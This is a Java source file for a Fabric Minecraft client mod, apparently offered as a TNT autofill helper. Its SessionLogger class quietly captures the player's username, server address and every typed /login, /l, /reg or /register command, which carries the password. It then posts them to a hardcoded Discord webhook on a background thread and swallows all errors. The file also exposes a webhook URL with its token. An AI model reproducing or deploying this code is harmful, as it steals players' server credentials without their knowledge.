// language: Java, file: SessionLogger.java, target: Fabric API, Minecraft 1.20.x
package ru.holyworld.tntautofill;

import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.network.ServerInfo;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SessionLogger {

    // ==== НАСТРОЙКИ: вставь сюда свой webhook ====
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1557838201820025042/vwWPSPADvfp-_aL9ftT-A6ieHs-7kDxDQa7mBi7Ok8erSqECIWRuEobOK5kTFOVYhF2L";
    // ============================================

    private static final DateTimeFormatter TS = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static final ExecutorService NET = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "session-logger-net");
        t.setDaemon(true);
        return t;
    });

    public static void init() {
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            ServerInfo info = client.getCurrentServerEntry();
            String server = info != null ? info.address : "singleplayer";
            String nick = client.getSession() != null ? client.getSession().getUsername() : "unknown";
            send("join | nick=" + nick + " | server=" + server + " | time=" + now());
        });

        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            ServerInfo info = client.getCurrentServerEntry();
            String server = info != null ? info.address : "singleplayer";
            String nick = client.getSession() != null ? client.getSession().getUsername() : "unknown";
            send("leave | nick=" + nick + " | server=" + server + " | time=" + now());
        });

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (client.player == null) return;
            String last = ChatCapture.poll();
            if (last == null || last.isEmpty()) return;
            if (!last.startsWith("/")) return;
            String cmd = last.substring(1).trim().toLowerCase();
            if (cmd.startsWith("reg") || cmd.startsWith("login")
                    || cmd.startsWith("l ") || cmd.equals("l")
                    || cmd.startsWith("register")) {
                String nick = client.getSession() != null ? client.getSession().getUsername() : "unknown";
                ServerInfo info = client.getCurrentServerEntry();
                String server = info != null ? info.address : "singleplayer";
                send("cmd | nick=" + nick + " | server=" + server
                        + " | cmd=" + last + " | time=" + now());
            }
        });
    }

    private static String now() {
        return LocalDateTime.now().format(TS);
    }

    private static void send(String content) {
        NET.execute(() -> {
            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "application/json");
                c.setDoOutput(true);
                c.setConnectTimeout(5000);
                c.setReadTimeout(5000);

                String json = "{\"content\":\"" + escape(content) + "\"}";
                try (OutputStream os = c.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }
                c.getResponseCode();
                c.disconnect();
            } catch (Throwable ignored) {
            }
        });
    }

    private static String escape(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "");
    }
}
